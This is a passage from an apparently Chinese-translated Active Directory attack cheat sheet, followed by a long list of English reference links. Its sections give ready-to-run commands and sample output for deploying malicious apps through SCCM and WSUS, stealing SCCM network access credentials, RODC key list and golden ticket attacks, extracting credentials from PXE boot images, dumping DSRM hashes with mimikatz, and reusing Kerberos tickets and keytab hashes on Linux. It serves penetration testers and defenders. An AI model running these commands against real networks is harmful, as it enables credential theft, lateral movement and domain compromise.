* [MalSCCM - 滥用本地或远程SCCM服务器，将恶意应用程序部署到它们管理的主机](https://github.com/nettitude/MalSCCM)


* 使用**SharpSCCM**

  ```ps1
  .\SharpSCCM.exe get device --server <SERVER8NAME> --site-code <SITE_CODE>
  .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
  .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
  ```

* 攻破客户端，使用locate找到管理服务器

  ```ps1
  MalSCCM.exe locate
  ```

* 以分发点管理员身份枚举WMI

  ```ps1
  MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
  ```

* 攻破管理服务器，使用locate找到主服务器

* 在主服务器上使用`inspect`查看您可以针对的目标

  ```ps1
  MalSCCM.exe inspect /all
  MalSCCM.exe inspect /computers
  MalSCCM.exe inspect /primaryusers
  MalSCCM.exe inspect /groups
  ```

* 为您稍后想要横向移动的机器创建一个新的设备组

  ```ps1
  MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
  MalSCCM.exe inspect /groups
  ```

* 将您的目标添加到新组中

  ```ps1
  MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
  ```

* 创建一个指向世界上可读共享上的恶意EXE的应用程序：`SCCMContentLib$`

  ```ps1
  MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
  MalSCCM.exe inspect /applications
  ```

* 将应用程序部署到目标组

  ```ps1
  MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
  MalSCCM.exe inspect /deployments
  ```

* 强制目标组签到以更新

  ```ps1
  MalSCCM.exe checkin /groupname:TargetGroup
  ```

* 清理应用程序、部署和组

```ps1
MalSCCM.exe app /cleanup /name:demoapp
MalSCCM.exe group /delete /groupname:TargetGroup
```

## SCCM网络访问账户

> 如果能够在作为SCCM客户端的主机上进行权限提升，可以检索纯文本域凭据。

在机器上。

* 查找SCCM Blob

  ```ps1
  Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
  NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
  NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
  ```

* 使用[GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244)或[Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM)进行SCCM检索和解密

  ```ps1
  .\SharpDPAPI.exe SCCM
  .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
  ```

* 检查位于`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`的CIM存储库的ACL：

  ```ps1
  Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
  ConvertFrom-SddlString ""
  ```

从远程机器。

* 使用[garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)

  ```ps1
  python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
  ```


## SCCM共享

> 在（系统中心）配置管理器（SCCM/CM）SMB共享上找到存储的有趣文件

* [1njected/CMLoot](https://github.com/1njected/CMLoot)

  ```ps1
  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
  ```


## WSUS部署

> Windows服务器更新服务（WSUS）使信息技术管理员能够部署最新的微软产品更新。您可以使用WSUS完全管理通过Microsoft更新发布到网络上计算机的更新分发

:warning: 有效负载必须是微软签名的二进制文件，并且必须指向磁盘上的一个位置，以便WSUS服务器加载该二进制文件。

* [SharpWSUS](https://github.com/nettitude/SharpWSUS)

1. 使用`HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate`或`SharpWSUS.exe locate`定位
2. 在WSUS服务器被攻破后：`SharpWSUS.exe inspect`
3. 创建恶意补丁：`SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
4. 在目标上部署它：`SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
5. 检查部署状态：`SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
6. 清理：`SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`

## RODC - 只读域控制器

RODC是在较不安全物理位置的域控制器的替代方案

- 包含AD的过滤副本（排除了LAPS和Bitlocker密钥）
- 在RODC的**managedBy**属性中指定的任何用户或组都具有对RODC服务器的本地管理员访问权限


### RODC黄金票证

* 你可以伪造一个RODC黄金票证，并将其呈现给仅针对RODC的**msDS-RevealOnDemandGroup**属性中列出的主体的可写域控制器，而不在RODC的**msDS-NeverRevealGroup**属性中。


### RODC密钥列表攻击

**要求**：

* [Impacket PR #1210 - Kerberos密钥列表攻击](https://github.com/SecureAuthCorp/impacket/pull/1210)

* RODC的**krbtgt**凭据（-rodcKey）

* RODC的**krbtgt**账户的ID（-rodcNo）

* 使用Impacket

  ```ps1
  # 使用SAMR用户枚举的keylistattack.py（无过滤）（-full标志）
  keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
  
  # 定义目标用户名的keylistattack.py（-t标志）
  keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
  
  # 使用Kerberos密钥列表攻击选项的secretsdump.py（-use-keylist）
  secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
  ```

* 使用Rubeus

  ```ps1
  Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
  Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
  ```


### RODC计算机对象

当你具有对RODC计算机对象的以下权限之一：**GenericWrite**、**GenericAll**、**WriteDacl**、**Owns**、**WriteOwner**、**WriteProperty**。

* 将域管理员账户添加到RODC的**msDS-RevealOnDemandGroup**属性中

  ```ps1
  PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
  ```


## PXE启动映像攻击

PXE允许工作站通过网络从服务器检索操作系统映像并使用TFTP（简单FTP）协议启动。这种通过网络启动允许攻击者获取映像并与之交互。

- 在PXE启动期间按**[F8]**键，在部署的机器上生成管理员控制台。

- 在初始Windows设置过程中按**[SHIFT+F10]**键，调出系统控制台，然后添加本地管理员或转储SAM/SYSTEM注册表。

  ```powershell
  net user hacker Password123! /add
  net localgroup administrators /add hacker
  ```

- 使用[PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe)提取预启动映像（wim文件），并深入挖掘以找到默认密码和域账户。

```powershell
# 导入模块
PS > Import-Module .\PowerPXE.ps1

# 在以太网接口上启动漏洞利用
PS > Get-PXEcreds -InterfaceAlias Ethernet
PS > Get-PXECreds -InterfaceAlias « lab 0 » 

# 等待DHCP获取地址
>> Get a valid IP address
>>> >>> DHCP proposal IP address: 192.168.22.101
>>> >>> DHCP Validation: DHCPACK
>>> >>> IP address configured: 192.168.22.101

# 从DHCP响应中提取BCD路径
>> Request BCD File path
>>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
>>> >>> TFTP IP Address:  192.168.22.3

# 下载BCD文件并提取wim文件
>> Launch TFTP download
>>>> Transfer succeeded.
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
>> Launch TFTP download
>>>> Transfer succeeded.

# 解析wim文件以查找有趣的数据
>> Open LiteTouchPE_x86.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
>>>> >>>> UserID = MdtService
>>>> >>>> UserPassword = Somepass1
```

## DNS侦察

执行ADIDNS搜索

```powershell
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
```

## DSRM凭据

> 目录服务还原模式（DSRM）是Windows Server域控制器的一种安全模式启动选项。DSRM允许管理员修复或恢复Active Directory数据库。

这是每个域控制器内的本地管理员账户。拥有这台机器的管理员权限后，你可以使用mimikatz转储本地管理员的哈希。然后，修改注册表以激活这个密码，这样你就可以远程访问这个本地管理员用户。

```ps1
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# 检查项是否存在并获取值
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# 如果不存在，则创建值为"2"的键
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# 将值更改为"2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

## LinuxAD域

## 从/tmp重用CCACHE票证

> 当票证设置为作为文件存储在磁盘上时，标准格式和类型是CCACHE文件。这是一种简单的二进制文件格式，用于存储Kerberos凭据。这些文件通常存储在/tmp中，并且具有600权限范围

使用`env | grep KRB5CCNAME`列出当前用于身份验证的票证。格式是可移植的，可以通过设置环境变量`export KRB5CCNAME=/tmp/ticket.ccache`来重用票证。Kerberos票证名称格式为`krb5cc_%{uid}`，其中uid是用户UID。 

```powershell
$ ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

$ export KRB5CCNAME=/tmp/krb5cc_1569901115
```

## 从密钥环重用CCACHE票证

从Linux内核密钥提取Kerberos票证的工具：https://github.com/TarlogicSecurity/tickey

```powershell
# 配置和构建
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] 检测到root，所以...转储所有票证!!
[*] 尝试注入tarlogic[1000]会话...
[+] 在tarlogic[1000]的进程25723中成功注入，查找票证请至/tmp/__krb_1000.ccache
[*] 尝试注入velociraptor[1120601115]会话...
[+] 在velociraptor[1120601115]的进程25794中成功注入，查找票证请至/tmp/__krb_1120601115.ccache
[*] 尝试注入trex[1120601113]会话...
[+] 在trex[1120601113]的进程25820中成功注入，查找票证请至/tmp/__krb_1120601113.ccache
[X] [uid:0] 检索票证出错
```

## 从SSSD KCM重用CCACHE票证

SSSD在路径`/var/lib/sss/secrets/secrets.ldb`处维护着一个数据库副本。相应的密钥存储为隐藏文件，路径为`/var/lib/sss/secrets/.secrets.mkey`。默认情况下，只有具有**root**权限的用户才能读取该密钥。

使用`--database`和`--key`参数调用`SSSDKCMExtractor`将解析数据库并解密秘密。

```powershell
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

凭据缓存Kerberos blob可以转换为可用的Kerberos CCache文件，可以传递给Mimikatz/Rubeus。

## 从keytab重用CCACHE票证

```powershell
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

## 从/etc/krb5.keytab提取账户

作为root运行的服务使用的服务密钥通常存储在keytab文件/etc/krb5.keytab中。这个服务密钥相当于服务的密码，必须保持安全。

使用[`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot)读取keytab文件并解析其内容。当[密钥类型](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey)为23时，您看到的密钥就是用户的实际NT哈希。

```powershell
$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] 服务主体：host/COMPUTER@DOMAIN
	 KVNO: 25
	 密钥类型：23
	 密钥：31d6cfe0d16ae931b73c59d7e0c089c0
	 时间戳：2019年10月7日 09:12:02
[...]
```

在Linux上，您可以使用[`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract)：我们希望使用RC4 HMAC哈希来重用NTLM哈希。

```powershell
$ python3 keytabextract.py krb5.keytab 
[!] 未找到RC4-HMAC。无法提取NTLM哈希。 # 没有运气
[+] Keytab文件成功导入。
        领域：DOMAIN
        服务主体：host/computer.domain
        NTLM哈希：31d6cfe0d16ae931b73c59d7e0c089c0 # 幸运
```

在macOS上，您可以使用`bifrost`。

```powershell
./bifrost -action dump -source keytab -path test
```

使用CME和哈希连接到计算机上的帐户。

```powershell
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```

## 从/etc/sssd/sssd.conf提取账户

> sss_obfuscate将给定的密码转换为人不可读的格式，并将其放置在SSSD配置文件的适当域部分，通常位于/etc/sssd/sssd.conf

混淆后的密码放在给定SSSD域的"ldap_default_authtok"参数中，并将"ldap_default_authtok_type"参数设置为"obfuscated_password"。

```ini
[sssd]
config_file_version = 2
...
[domain/LDAP]
...
ldap_uri = ldap://127.0.0.1
ldap_search_base = ou=People,dc=srv,dc=world
ldap_default_authtok_type = obfuscated_password
ldap_default_authtok = [BASE64_ENCODED_TOKEN]
```

使用[mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)对ldap_default_authtok变量的内容进行去混淆。

```ps1
./sss_deobfuscate [ldap_default_authtok_base64_encoded]
./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```


## 参考

* [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
* [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
* [BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
* [Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html)
* [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
* [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger ](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)
* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
* [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
* [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
* [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
* [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
* [Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
* [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
* [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
* [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
* [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
* [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
* [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)
* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
* [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
* [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
* [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
* [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
* [Active-Directory-Exploitation-Cheat-Sheet - @buftas](https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation)
* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
* [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
* [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
* [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
